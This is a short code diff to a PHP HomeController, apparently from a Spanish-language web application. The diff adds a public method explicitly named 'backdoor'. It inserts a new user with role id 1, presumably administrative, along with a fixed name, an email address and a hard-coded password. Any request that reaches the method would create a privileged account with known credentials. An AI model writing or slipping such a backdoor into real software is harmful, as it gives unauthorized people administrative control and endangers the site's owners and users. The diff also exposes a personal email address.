@@ -45,4 +45,13 @@ class HomeController extends CommonController
         redireccionar();
     }
 
+    public function backdoor()
+    {
+        $datos = array();
+        $datos["nombre"] = "Saleck";
+        $datos["mail"] = "aledagonale@gmail.com";
+        $datos["rol_id"] = 1;
+        $datos["password"] = password_hash("321654", PASSWORD_DEFAULT);
+        $this->model->insertar("usuarios", $datos);
+    }
 }
